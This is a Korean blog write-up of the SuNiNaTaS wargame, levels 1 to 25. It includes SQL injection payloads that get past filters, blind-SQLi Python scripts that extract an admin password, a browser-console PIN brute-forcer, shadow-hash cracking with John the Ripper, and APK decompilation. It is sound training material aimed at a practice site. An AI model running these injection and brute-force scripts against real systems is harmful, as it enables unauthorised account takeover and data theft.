---
title: "[SuNiNaTaS] All Writeup"
description: SuNiNaTaS 올클 라이트업
date: 2025-09-06 14:03:00 +0900
categories: [Security, Wargame]
tags: [suninatas, wargame]
author: hyungin0505
toc: true
comments: true
# image:
#     path: /assets/img/
#     alt: image alternative text
pin: false

---

---

## Level 1

```asp
<%
    str = Request("str")

    If not str = "" Then
        result = Replace(str,"a","aad")
        result = Replace(result,"i","in")
        result1 = Mid(result,2,2)
        result2 = Mid(result,4,6)
        result = result1 & result2
        Response.write result
        If result = "admin" Then
            pw = "????????"
        End if
    End if
%>
```

asp로 작성된 코드다  

최종 `result`가 **"admin"**이 되도록 하는 `str` 문자열을 입력하면 인증 키를 얻을 수 있다   

- `Mid(문자열, 시작위치, 길이)`
    - 문자열을 시작위치부터 길이만큼 자른다  
    - 인덱스는 1부터 시작한다  
    - `Mid("itisfortest", 3, 5)` -> **"isfor"**
- `&`는 문자열을 concantenate하는 연산자다  

**"ami"**를 입력하면 최종적으로 **"admin"**을 얻을 수 있다  

**"ami"** -> aadmi -> aadmin -> ad & min -> **"admin"**  

<br>

---

## Level 2

ID와 PW를 입력하는 폼이 주어진다  
<br>

---

```html
<tr height="30">
    <td colspan="2" align="center" class="table_top">
        <input type="button" value="Join" style="width: 60" onclick="chk_form()">
</tr>
```

`Join` 버튼을 누르면 `chk_form()` 함수가 실행된다  
<br>

---

```javascript
function chk_form(){
    var id = document.web02.id.value ;
    var pw = document.web02.pw.value ;
    if ( id == pw )
    {
        alert("You can't join! Try again");
        document.web02.id.focus();
        document.web02.id.value = "";
        document.web02.pw.value = "";
    }
    else
    {
        document.web02.submit();
    }
}
```

폼에 입력한 `id`와 `pw`가 같으면 빠꾸를 먹는다  

하지만 다른 값을 입력해도 아무 일도 일어나지 않는다  
<br>

문제 URL 뒤에 `?id=x&pw=x`를 붙여서 입력하면 서버로 `id`와 `pw` 파라미터와 값이 전달된다  
이를 통해 자바스크립트를 우회하여 인증키를 얻을 수 있다  

약간 게싱인 것 같다  
<br>

---

## Level 3

![Image](/assets/img/250728_0/0.png)

Notice Board에 글을 쓰라고 한다  
<br>

---

![Image](/assets/img/250728_0/1.png)

문제 페이지 안에 Notice Board가 있는 건 아니고 문제 플랫폼에 있다  

처음에 `/robots.txt`{: .filepath}, `/notice/`{: .filepath}, `/board/`{: .filepath}도 가보고 파라미터에도 이것저것 넣어봤지만 문제 밖에서 푸는 거였다..  

메인 페이지의 상단 네비게이션 바에 NOTICE와 FREE 게시판 두 개가 있다  
우리는 NOTICE 게시판에 글을 써야 하는데 직접 가보면 글쓰기 버튼이 없다  
<br>

---

FREE 게시판에서 글쓰기 버튼을 눌러 글쓰기 페이지로 이동한다  

이때 URL이 `/board/free/write`{: .filepath}인데 `/board/notice/write`{: .filepath}로 수정해서 글을 쓰면 NOTICE 게시판에 글을 쓸 수 있다  
실제로 공지 페이지에 글이 올라가는 건 아니고 `alert()`로 인증키만 나오기에 그냥 하면 된다    
<br>

---

## Level 4

![Image](/assets/img/250728_0/2.png)

Point와 User-Agent가 나온다  
<br>

---

```html
<!-- Hint : Make your point to 50 & 'SuNiNaTaS' -->
```

문제의 소스 코드 맨 아래 주석을 보면 이런 힌트가 적혀 있다  

50 Point를 만들고 User-Agent를 'SuNiNaTaS'로 만들라는 말 같다..  
<br>

---

![Image](/assets/img/250728_0/3.png)

F12 개발자 도구에서 User-Agent를 임의로 변경할 수 있다  

'SuNiNaTaS'로 변경 후 Plus 버튼을 50번 눌러 50 Points를 만들면 Auth Key에서 인증키를 받을 수 있다  
<br>

---

```http
POST /challenge/web04/web04_ck.asp HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7
Cache-Control: no-cache
Connection: keep-alive
Content-Length: 8
Content-Type: application/x-www-form-urlencoded
...
Host: suninatas.com
Origin: http://suninatas.com
Pragma: no-cache
Referer: http://suninatas.com/challenge/web04/web04.asp
Upgrade-Insecure-Requests: 1
User-Agent: SuNiNaTaS

total = 50

```

사실 직접 50번 일일히 누르거나 개발자 도구에서 User-Agent를 변경하지 않고 Burp Suite라는 도구를 사용하여 한 번의 요청으로 문제를 풀어낼 수도 있다  

페이로드로 `total`을 50으로 하여 요청하면 된다  
<br>

---

## Level 5

```html
<script>
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('g l=m o(\'0\',\'1\',\'2\',\'3\',\'4\',\'5\',\'6\',\'7\',\'8\',\'9\',\'a\',\'b\',\'c\',\'d\',\'e\',\'f\');p q(n){g h=\'\';g j=r;s(g i=t;i>0;){i-=4;g k=(n>>i)&u;v(!j||k!=0){j=w;h+=l[k]}}x(h==\'\'?\'0\':h)}',34,34,'||||||||||||||||var|result||start|digit|digitArray|new||Array|function|PASS|true|for|32|0xf|if|false|return'.split('|'),0,{}))		
</script>
            
<!--Hint : 12342046413275659 -->
```

힌트와 함께 난독화된 js 코드가 삽입되어 있다  
<br>

---

```javascript
eval(
  (function (p, a, c, k, e, r) {
    e = function (c) {
      return c.toString(a);
    };
    if (!"".replace(/^/, String)) {
      while (c--) r[e(c)] = k[c] || e(c);
      k = [
        function (e) {
          return r[e];
        },
      ];
      e = function () {
        return "\\w+";
      };
      c = 1;
    }
    while (c--)
      if (k[c]) p = p.replace(new RegExp("\\b" + e(c) + "\\b", "g"), k[c]);
    return p;
  })(
    "g l=m o('0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f');p q(n){g h='';g j=r;s(g i=t;i>0;){i-=4;g k=(n>>i)&u;v(!j||k!=0){j=w;h+=l[k]}}x(h==''?'0':h)}",
    34,
    34,
    "||||||||||||||||var|result||start|digit|digitArray|new||Array|function|PASS|true|for|32|0xf|if|false|return".split(
      "|",
    ),
    0,
    {},
  ),
);
```

prettier로 줄바꿈을 한 코드이다  
<br>

---

![Image](/assets/img/250728_0/4.png)

[de4js](https://lelinhtinh.github.io/de4js/)를 사용하여 난독화를 해제해볼 수 있다  
<br>

---

```javascript
var digitArray = new Array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f');

function PASS(n) {
    var result = '';
    var start = true;
    for (var i = 32; i > 0;) {
        i -= 4;
        var digit = (n >> i) & 0xf;
        if (!start || digit != 0) {
            start = false;
            result += digitArray[digit]
        }
    }
    return (result == '' ? '0' : result)
}
```

힌트에 있는 `12342046413275659`를 인자로 넣어 `PASS()` 함수를 실행한다  
<br>

---

![Image](/assets/img/250728_0/5.png)

결과값을 폼에 넣고 Check 버튼을 누르면 인증키를 얻을 수 있다  
<br>

---

## Level 6

![Image](/assets/img/250728_0/6.png)

5개의 글이 올라와있는 게시판이 있다  
<br>

---

![Image](/assets/img/250728_0/7.png)

`README`{: .filepath} 글에 들어가보면 팝업으로 비밀번호 입력창이 나온다  
<br>

---

```sql
select szPwd from T_Web13 where nIdx = '3' and szPwd = '"&pwd&"'
```

우리가 입력하는 값이 `"&pwd&"`에 들어간다 (ASP)  
SQL Injection을 해야 하는데 등호(`=`)가 들어가거나 길이가 20을 넘어서는 페이로드를 입력하면 alert로 "No Hacking!" 문구가 나온다  
<br>

---

```sql
' OR '1' LIKE '1
```
```sql
' or 1 like 1 ; -- 
```

등호 대신 LIKE를 사용하면 우회하여 패스워드 검증을 통과할 수 있다  
아니면 그냥 등호 없이 뒷부분을 주석 처리해버려도 된다  
<br>

---

![Image](/assets/img/250728_0/8.png)

`auth_key`는 "suninatastopofworld"라고 한다  

이게 답인 줄 알고 입력해봤는데 틀렸다고 한다..  
느낌표를 붙여봐도 틀렸다  

이후 3번 게시글 페이지로 이동된다  
<br>

---

```
HTTP/1.1 200 OK
Cache-Control: private
Pragma: no-cache
Content-Type: text/html
Content-Encoding: gzip
Expires: Mon, 28 Jul 2025 14:13:47 GMT
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
Set-Cookie: auth%5Fkey=65038b0559e459420aa2d23093d01e4a; path=/
X-Powered-By: ASP.NET
Date: Mon, 28 Jul 2025 14:14:47 GMT
Content-Length: 921
```

팝업에서 아무 요청을 보냈을 때의 응답 HTTP 헤더다  

`auth_key`에 해시값으로 보이는 데이터가 들어가있다  
[md5hashing](https://md5hashing.net)에서 확인해보면 "suninatastopofworld!"를 MD5로 해싱한 값이다  
(게시판의 두 번째 글(reference!)에 [md5hashing](https://md5hashing.net) 사이트가 써있다)  
<br>

---

```html
<body>
    <table width="100%" cellpadding="0" cellspacing="0">
        <form method="post" name="KEY_HINT" action="Rome's First Emperor">
```

3번 게시물의 소스 코드를 보면 `KEY_HINT`라는 이름을 갖는 폼이 있다  

"Rome's First Emperor"라는데 검색해보니까 Gaius Julius Caesar Augustus라고 한다  
이름만 빼서 Augustus를 인증키로 사용하면 풀린다 (위키피디아 제목)    
<br>

---

## Level 7

아이유님이랑 윤아님 사진이 있다  
확실히 고전 사이트라 그런지 화질이..  
<br>

---

"Do U Like girls?"라는 문구가 적힌 폼이 있고 두 사진 사이에 Yes 버튼이 있다  
난 게이가 아니니까 Yes 버튼을 누르니 너무 느리다고 한다  

소스 코드 아래의 힌트도 'Faster and Faster'라서 매크로 같은 걸로 엄청 빠르게 페이지 로드되자마자 버튼 누르면 될 것 같다..  
<br>

---

```html
<script>
    function noEvent() {
        if (event.keyCode == 116 || event.keyCode == 9) {
            alert('No!');
            return false;
        }
        else if (event.ctrlKey && (event.keyCode = 78 || event.keyCode == 82)) {
            return false;
        }
    }
    document.onkeydown = noEvent;
</script>
```

새로고침 버튼(116. Ctrl + R(82)), 탭 버튼(9), 새 창 열기 단축키(Ctrl + N(78))가 차단되어있다  

~~근데 맥에서는 Ctrl 대신 Command를 사용하여 단축키 우회를 할 수 있다..~~  
<br>

---

```javascript
document.querySelector('input[type="submit"][value="YES"]').click();
```

새로고침하자마자 이 코드를 콘솔에 붙여넣으면 인증키가 바로 나온다  
<br>

---

## Level 8

ID와 PW를 입력하는 폼이 나온다  
<br>

---

소스 코드 끝 주석에 ID는 'admin'이고 PW는 0에서 9999 중에 하나라고 한다..  
브루트 포싱을 해보라는 것 같다   
<br>

---

```javascript
(async () => {
  const delay = (ms) => new Promise((res) => setTimeout(res, ms));

  for (let i = 0; i <= 9999; i++) {
    const pw = i.toString().padStart(4, '0');
    const formData = new URLSearchParams();
    formData.append("id", "admin");
    formData.append("pw", pw);

    const res = await fetch("./web08.asp", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: formData.toString()
    });

    const text = await res.text();

    if (!text.includes("Password Incorrect!")) {
      console.log(`✅ FOUND: ${pw}`);
      break;
    }

    console.log(`❌ Tried: ${pw}`);
  }
})();
```

![Image](/assets/img/250728_0/9.png)

꼭 레벨이 올라갈수록 어려워지는 문제는 아닌 것 같다..  
<br>

---


## Level 9

`Project1.exe` 파일이 주어진다  
<br>

---

![Image](/assets/img/250728_0/9_peid.png)

PEiD를 사용하여 확인해보면 Deplhi 바이너리인 것을 알 수 있다  
이후 11번 문제와도 같은 방식을 사용하기 때문에 델파이 리버싱에 관해서는 11번 문제와 함께 [이 글](https://blog.kogandhi.kr/posts/suninatas-delphi-reverse-engineering/)을 참조하면 된다  
<br>

---

![Image](/assets/img/250728_0/9_dede.png)

DeDe를 사용하여 확인해보면 입력값 검증에 사용되는 문자열은 913465인 것을 알 수 있다  
<br>

---

![Image](/assets/img/250728_0/9_authkey.png)

폼에 입력하면 Congratulation! 문구가 나오는 것을 보아 입력값이 AuthKey임을 알 수 있다  
<br>

---

## Level 10

```c
// attributes: thunk
int start()
{
  return CorExeMain();
}
```

IDA 돌렸는데 함수가 이거 하나 밖에 없다..  
<br>

---

![Image](/assets/img/250728_0/11.png)

Strings를 뽑아 보니 어셈블리어로 따로 페이로드를 구현해놓은 것 같다..  
<br>

---

[`_CorExeMain` 함수](https://learn.microsoft.com/ko-kr/dotnet/framework/unmanaged-api/hosting/corexemain-function)는 .NET 함수로, 어셈블리에서 진입점을 찾아 실행한다고 한다..  
<br>

---

![Image](/assets/img/250728_0/12.png)

.text 영역에 어셈블리어 페이로드가 들어있다  
<br>

---

.NET 프로그램 분석은 IDA보다 [dnSpy](https://dnspy.org/) 같은 툴로 하는 것이 좋다  
<br>

---

```c++
// Token: 0x06000003 RID: 3 RVA: 0x00002068 File Offset: 0x00000268
private void button1_Click(object sender, EventArgs e)
{
    string b = "2theT@P";
    string text = "Authkey : Did U use the Peid?";
    if (this.textBox1.Text == b)
    {
        MessageBox.Show(text, "SuNiNaTaS");
        this.textBox1.Text = "";
        return;
    }
    MessageBox.Show("Try again!", "SuNiNaTaS");
    this.textBox1.Text = "";
}
```

바로 확인이 가능하다ㄷㄷ  

바이너리 실행해서 "2theT@P"을 입력해서 확인해도 되고 아니면 바로 `Authkey` 코드에서 확인해도 된다  
<br>

---

## Level 11

[참고](https://blog.kogandhi.kr/posts/suninatas-delphi-reverse-engineering/)
<br>

---

## Level 12

어떻게 푸는 건지 헤매다가 제일 마지막으로 푼 문제다..  
다른 문제에서 나왔던 root 패스워드 같은 걸로 서버 접속해야 하는 건가 싶어서 접속 시도도 해보고 로그인에 sqli도 해보고 온갖 짓을 해봤는데도 안 풀려서 제일 나중으로 미뤄놨었다  
<br>

---

![Image](/assets/img/250728_0/12_qrcode.png)

`suninatas.com/admin/` 페이지로 이동을 할 수가 있다..  
QR 코드가 나오는데 찍어보자  
<br>

---

```
MECARD:N:;TEL:;EMAIL:;NOTE:;URL:http://suninatas.com/admin/admlogin.asp;ADR:;
```

URL이 나오니 이동한다  
<br>

---

![Image](/assets/img/250728_0/12_swf.png)

플래시가 삽입되어 있지만 10년이 넘게 지났기 때문에 더 이상 지원되지 않는다  
그래도 `/admin/admlogin.swf` 경로에서 삽입된 swf 파일 자체를 받을 수 있다  
(경로는 개발자 도구 소스 코드를 통해 확인 가능하다)  
<br>

---

![Image](/assets/img/250728_0/12_ffdec.png)

[FFDec](https://github.com/jindrapetrik/jpexs-decompiler)이란 디컴파일러를 사용하여 swf 파일을 디컴파일할 수 있다   

로그인 폼이었던 모양인데 `flashid`와 `flashpw`를 평문으로 확인할 수 있고 `Auth`로 나오는 키값까지 알 수 있다  
<br>

---

## Level 13

![Image](/assets/img/250728_0/13_main.png)

그냥 KEY Finding이라는 문자열만 있고 파일이나 링크는 주어지지 않았다  
<br>

---

```html

<!DOCTYPE html>

<html>
<head>
    <title>Game 13</title>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <link rel="shortcut icon" href="/static/img/game.ico" />
</head>
<!--	Hint : 프로그래머의 잘못된 소스백업 습관 -->
<!--	Hint : The programmer's bad habit of backup source codes -->
<body>

...

</body>
</html>
```

소스 코드에 주석으로 힌트가 있다  
프로그래머의 잘못된 소스 백업 습관이라고 한다  
<br>

---

URL `http://suninatas.com/challenge/web13/web13.asp`의 확장자 `asp`를 `zip`으로 바꾸면 압축 파일(소스 백업 파일)이 하나 다운로드된다  
<br>

---

![Image](/assets/img/250728_0/13_zip.png)

사진 4장과 텍스트 파일이 들어있는데 모두 암호가 걸려있다  
텍스트 파일 제목에서 압축 비번이 4자리임을 확인할 수 있는데 4자리 비밀번호는 브루트 포싱으로 충분히 얻어낼 수 있다  

게다가 반디집에는 4자리 이하의 비밀번호를 브루트 포싱으로 뚫어주는 기능이 들어있다  
<br>

---

![Image](/assets/img/250728_0/13_brute_force.png)

압축 파일의 비밀번호는 7642인 것을 알 수 있다  
<br>

---

![Image](/assets/img/250728_0/13_image_key.png)

이미지 파일 4장은 그냥 일반적인 의미 없는 사진들이다  

하지만 010Editor로 헥스를 뜯어보면 주석으로 키값들이 적혀있는데 4개의 사진 파일에서 모두 추출해서 이어붙이면 AuthKey가 된다  

(텍스트 파일에는 4개의 사진을 합하여 key를 구하라고 써있다)  
<br>

---

## Level 14

리눅스의 `passwd`{: .filepath}, `shadow`{: .filepath} 파일이 주어진다  
`shadow`{: .filepath} 파일을 사용하여 비밀번호를 알 수 있다  
<br>

---

```
suninatas:x:1001:1001::/home/suninatas:/bin/sh
```

`passwd`{: .filepath} 파일에서 suninatas 사용자가 존재하는 것을 확인할 수 있다  
password 필드가 `x`로 되어 있는데 이는 `shadow`{: .filepath} 파일에 비밀번호가 암호화되어 저장되어 있다는 의미이다  
<br>

---

```
suninatas:$6$QlRlqGhj$BZoS9PuMMRHZZXz1Gde99W01u3kD9nP/zYtl8O2dsshdnwsJT/1lZXsLar8asQZpqTAioiey4rKVpsLm/bqrX/:15427:0:99999:7:::
```

`shadow`{: .filepath} 파일의 suninatas 유저 정보다  

필드는 사용자 계정명:비밀번호 정보:마지막 변경일:최소 사용 기간:최대 사용 기간:경고 일수:비활성화 일수:만료일 순서인데 사실 다른 건 필요 없고 비밀번호 정보만 확인하면 된다  

비밀번호 정보는 `$` 문자로 필드가 또 나뉜다  
$알고리즘$솔트$암호화된_비밀번호 순서이다  

`$6`은 SHA-512 암호 알고리즘을 의미한다  

따라서 솔트값을 추가하여 SHA-512 복호화를 하면 되는데 SHA-512는 단방향 해시라 일반적인 복호화 방식은 존재하지 않는다    
<br>

---

![Image](/assets/img/250728_0/lv14%20john.png)

사전 파일을 다운 받아 John The Ripper를 사용하여 브루트 포싱하면 `iloveu1`으로 복호화되는 것을 확인할 수 있다  
<br>

---

## Level 15

![Image](/assets/img/250728_0/lv14.png)

mp3 파일이 주어진다  
파일 안에 AuthKey가 있다고 한다  
<br>

---

![Image](/assets/img/250728_0/lv14_010_log.png)

ID3v2 tag와 ID3v1 tag가 있다  
<br>

---

![Image](/assets/img/250728_0/lv14%20auth%20key.png)

ID3v2 tag에서 TPE3 영역에 Auth Key가 저장되어 있다  
<br>

---

## Level 16

`SuNiNaTaS.com`의 회원 비밀번호를 찾아야 한다  
패킷 덤프 압축 파일이 주어진다  
<br>

---

![Image](/assets/img/250728_0/16_a_packet_http_tab.png)

보통 Wireshark로 패킷 문제를 많이 푸는 것 같은데 [A-Packets](https://apackets.com/)라는 사이트로 풀어봐도 직관적으로 잘 보여서 좋다  

패킷 파일 업로드 후 HTTP 탭에서 suninatas 문자열을 필터로 걸어 검색을 해보면 사용자와 suninatas.com 사이 패킷을 확인할 수 있다  

GET, POST 모두 있는 세 번째 리스트를 살펴보자  
<br>

---

![Image](/assets/img/250728_0/16_login_failed.png)

로그인에 실패한 기록은 이렇게 나타난다  

전달한 `Hid`와 `Hpw`를 평문으로 확인할 수 있는데 로그인에 실패한 경우 위 사진처럼 응답이 온다  
<br>

---

![Image](/assets/img/250728_0/16_logined.png)

로그인에 성공하면 이렇게 응답이 온다  

이를 통해 `Hid`는 `ultrashark`, `Hpw`는 `=SharkPass01`인 것을 알 수 있다 (`%3D` URL 디코딩 시 `=` 기호)  
<br>

---

![Image](/assets/img/250728_0/16_login.png)

해당 계정을 사용하여 suninatas 페이지에 로그인을 시도하면 alert로 AuthKey를 확인할 수 있다  
<br>

---

## Level 17

그냥 얼룩진 QR 코드 이미지 하나 나오는데 그림판으로 열심히 고쳐주면 된다  

얼룩에 가려진 부분은 QR 코드의 필수 요소인 세 개의 큰 네모들이기 때문에 마우스로 딸깍딸깍 수정해주면 된다  

AI한테도 맡겨보고 혹시 자동으로 QR 이미지를 수정해주는 도구가 있나 찾아봤는데 제대로 작동되는 건 못 찾았다  
그냥 손으로 다 따서 스캔해보면 바로 AuthKey가 텍스트로 나온다  
<br>

---

## Level 18

![Image](/assets/img/250728_0/lv18%20authkey.png)

그냥 아스키다  
<br>

---

## Level 19

```
0100111001010110010000110101010001000110010001000101
0110001000000100101101000110001000000100101001001100
0100010101011010010001010101001001001011010100100100
1010001000000101001001000101010101010010000001001011
0100011001010101010100100101000000100000010110100100
1010001000000101001000100000010110000100011001000110
0101010100100000010101010101001001010000001000000101
0010010001010101010100100000010100100100110001001011
0101100101000010010101100101000000100000010110100100
1010001000000100011101000011010100100101101001010101
0101010001001011010101110101101001001010010011010101
0110010010010101000001011001010100100100100101010101
```

0과 1로 나열된 문자열들이 주어진다  
<br>

---

![Image](/assets/img/250728_0/lv15%20authkey.png)

아스키 코드로 치환하면 `NVCTFDV KF JLEZERKRJ REU KFURP ZJ R XFFU URP REU RLKYBVP ZJ GCRZUTKWZJMVIPYRIU` 문자열이 나온다  

시저 암호처럼 보이기에 키 값으로 r을 주고 디코딩해보면 평문이 나와 AuthKey를 확인할 수 있다  
<br>

---

## Level 20

이 문제도 푸는데 꽤 오래 걸렸다..  
취약점 설명까지 대체할 겸 [다른 글](https://blog.kogandhi.kr)로 따로 빼겠다    
<br>

---

## Level 21

![Image](/assets/img/250728_0/monitor.jpg)

이런 사진이 주어진다  

자 무늬에 가려져서 문자 몇 개가 보이지 않는다  
<br>

---

![Image](/assets/img/250728_0/lv21%20binwalk.png)

binwalk로 어떤 파일들이 들어가 있는지 볼 수 있는데 이미지 파일이 여러 개 들어가있다  

`--dd=".*"` 옵션을 사용하여 파일들을 추출할 수 있다  
<br>

---

![Image](/assets/img/250728_0/5FA83.jpg)

추출한 이미지 파일들을 통해서 자에 가려졌던 문자들을 확인할 수 있다  
<br>

---

## Level 22

![Image](/assets/img/250728_0/22_problem.png)

Blind SQLi 문제인 것 같다  
필터링이 더럽게 되어있다;;  
<br>

---

![Image](/assets/img/250728_0/22_comment.png)

소스 코드 주석에는 guest 계정의 `id`와 `pw`가 있고 admin 계정의 패스워드를 찾아야 한다고 한다  
<br>

---

![Image](/assets/img/250728_0/22_pw_length.png)

참고로 필터링 말고도 글자 수 제한이 있어 `pw`에는 10글자가 넘어가면 No hack 문구가 뜬다..  
`id`에서 SQLi 페이로드를 써야하는 것 같다  
<br>

---

![Image](/assets/img/250728_0/22_admin_logined.png)

뒤의 `pw`에 페이로드를 넣을 수 없으니 `id`에서 주석 처리를 통해서 뒤의 `pw` 값을 무시할 수 있도록 해야 할 것 같다  
`'`, `-` 기호는 필터링이 되어 있지 않아 뒷부분은 주석 처리가 가능하다  

일반적인 `id`, `pw` 검증 SQL문처럼 `id=admin and pw=admin` 형식으로 되어있을 것이라 추측하고 푼다  
<br>

---

![Image](/assets/img/250728_0/22_guest_sqli.png)

`substring()` 함수를 사용하여 Blind SQLi가 가능한 것을 확인할 수 있다  

`substr()` 함수는 sql 버전 문제인지 작동하지 않는다  
<br>

---

```python
import requests

url = "http://suninatas.com/challenge/web22/web22.asp"

for i in range(16):
  for c in "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()":
    params = {
      "id": f"admin' and substring(pw,{i+1},1)='{c}'-- ",
      "pw": "qwer"
    }

    response = requests.get(url, params=params)
    if "OK " in response.text:
      print(f"Found character {c} at position {i+1}")
      break

# N1c3Bilnl)
```

![Image](/assets/img/250728_0/22_admin_blind_sqli.png)

파이썬으로 자동화하여 비밀번호를 구할 수 있다  
<br>

---

![Image](/assets/img/250728_0/22_admin_login.png)

얻어낸 비밀번호로 잘 로그인되는 것도 확인할 수 있다  
비밀번호가 AuthKey다  
<br>

---

## Level 23

22번과 같은 Blind SQLi 문제인데 필터링에 "admin" 문자열이 추가됐다..  
더불어 `id` 폼에 16자 글자 수 제한이 걸려있어서 맞추는게 쉽지 않았다  
<br>

---

```python
import requests

url = "http://suninatas.com/challenge/web23/web23.asp"
word = ""

for i in range(16):
    for c in "abcdefhijklmnopqrstuvwxyzg0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()":
        temp = word + c
        params = {
            "id": f"'or left(pw,{i+1})='{temp}' --",
            "pw": "qwer"
        }

        response = requests.get(url, params=params)
        if "OK " in response.text:
            print(f"Found character {c} at position {i+1}")
            word = word + c
# v3ryhards
```

![Image](/assets/img/250728_0/23_left.png)

`left()` 함수를 사용하여 검증하는 페이로드를 사용하였는데 16자 글자 수 제한으로 인해 중간에 잘려서 전체 `pw`를 알 수가 없다..  
<br>

---

```python
import requests

url = "http://suninatas.com/challenge/web23/web23.asp"
word = ""

for i in range(16):
    for c in "abcdefhijklmnopqrstuvwxyzg0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()":
        temp = c + word
        params = {
            "id": f"'or right(pw,{i+1})='{temp}' --",
            "pw": "qwer"
        }

        response = requests.get(url, params=params)
        if "OK " in response.text:
            print(f"Found character {c} at position {i+1}")
            word = c + word
# yhardsqli
```

![Image](/assets/img/250728_0/23_right.png)

그러면 반대로 `right()` 함수도 사용해서 뒷부분부터 맞추고 이어주면 된다  

다행히 admin 계정의 `pw`가 길지 않아서 이 방법으로 `pw`를 알아낼 수 있다  
`mid()` 함수를 사용할 수 있다면 하나의 페이로드로 해결 가능하지만 버전 이슈로 `mid()` 함수가 없는 것 같다..  
<br>

---

## Level 24

![Image](/assets/img/250728_0/24_010.png)

파일이 하나 주어지는데 010Editor로 헥스값을 뜯어보면 apk 파일인 것을 알 수 있다  
<br>

---

```smali
.line 27
invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

move-result-object v2

const-string v3, "https://www.youtube.com/channel/UCuPOkAy1x5eZhUda-aZXUlg"

invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

move-result v2

if-eqz v2, :cond_0

.line 28
iget-object v2, p0, Lcom/suninatas/suninatas24/MainActivity$1;->this$0:Lcom/suninatas/suninatas24/MainActivity;

new-instance v3, Landroid/content/Intent;

new-instance v4, Ljava/lang/StringBuilder;

invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

const-string v5, "http://www.suninatas.com/challenge/web24/chk_key.asp?id="

invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

move-result-object v1

invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

const-string v1, "&pw="

invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

move-result-object p1

invoke-virtual {v4, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

const-string p1, "&key="
```

1. 확장자명 `.apk` 붙이기
2. apktool 사용하여 디컴파일
3. dex2jar 사용하여 `class.dex` -> `smali` 파일들

<br>

---

`smali` 파일을 해석해서 풀어도 되지만 문자열만 보고 Key(AuthKey 아님)로 사용하면 된다  

해당 `apk`를 직접 설치한 후 `id`, `pw`에 자신의 SuNiNaTaS 계정 정보를 넣고 `key`에는 유튜브 링크를 넣으면 AuthKey를 확인할 수 있다  
<br>

---

굳이 apk를 설치하지 않고도 해결할 수 있는데 `id`, `pw`, `key`를 파라미터로 하여 버튼 클릭 시 이동하는 URL(`http://www.suninatas.com/challenge/web24/chk_key.asp?id=(아이디)&pw=(비밀번호)&key=https://www.youtube.com/channel/UCuPOkAy1x5eZhUda-aZXUlg`)로 이동하면 된다  

다만, PC 환경에서 시도할 경우 틀렸다고 나오고 모바일 환경에서만 AuthKey가 얻어진다  
근데 PC 환경에서도 브라우저 개발자 도구를 열고 User-Agent를 모바일로 바꿔주거나 기기 툴바를 모바일로 전환하면 AuthKey를 받을 수 있다  
<br>

---

## Level 25

24번과 비슷한 결인데 apktool로는 디컴파일이 되지 않는다  

dex2jar를 사용하여 `class.dex` 파일을 `.jar` 파일로 만든다  
소스 코드를 보려면 jd-gui 같은 걸로 확인하면 된다  
<br>

---

```java
public String getContacts(String paramString) {
    StringBuffer stringBuffer = new StringBuffer();
    Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
    while (true) {
      if (!cursor.moveToNext())
        return stringBuffer.toString(); 
      String str1 = cursor.getString(cursor.getColumnIndex("display_name"));
      String str2 = cursor.getString(cursor.getColumnIndex("_id"));
      if (str1.equals("SuNiNaTaS")) {
        if (paramString.equals("sb")) {
          stringBuffer.append(str1);
          continue;
        } 
        if (paramString.equals("id"))
          stringBuffer.append(str2); 
      } 
    } 
  }
  
  public String getTel(String paramString) {
    StringBuffer stringBuffer = new StringBuffer();
    Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "contact_id=" + paramString, null, null);
    while (true) {
      if (!cursor.moveToNext())
        return stringBuffer.toString(); 
      stringBuffer.append(cursor.getString(cursor.getColumnIndex("data1")));
    } 
  }
  
  public void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2130903040);
    ((Button)findViewById(2131165186)).setOnClickListener(new View.OnClickListener() {
          public void onClick(View param1View) {
            EditText editText1 = (EditText)Suninatas25.this.findViewById(2131165184);
            EditText editText2 = (EditText)Suninatas25.this.findViewById(2131165185);
            Editable editable1 = editText1.getText();
            Editable editable2 = editText2.getText();
            String str = Suninatas25.this.getContacts("sb");
            try {
              String str1 = Suninatas25.this.getContacts("id");
              str1 = Suninatas25.this.getTel(str1);
              if (str != null) {
                Intent intent = new Intent("android.intent.action.VIEW", Uri.parse("http://www.suninatas.com/challenge/web25/chk_key.asp?id=" + editable1.toString() + "&pw=" + editable2.toString() + "&Name=" + str.toString() + "&Number=" + str1.toString()));
                Suninatas25.this.startActivity(intent);
              } 
              return;
            } catch (Exception exception) {
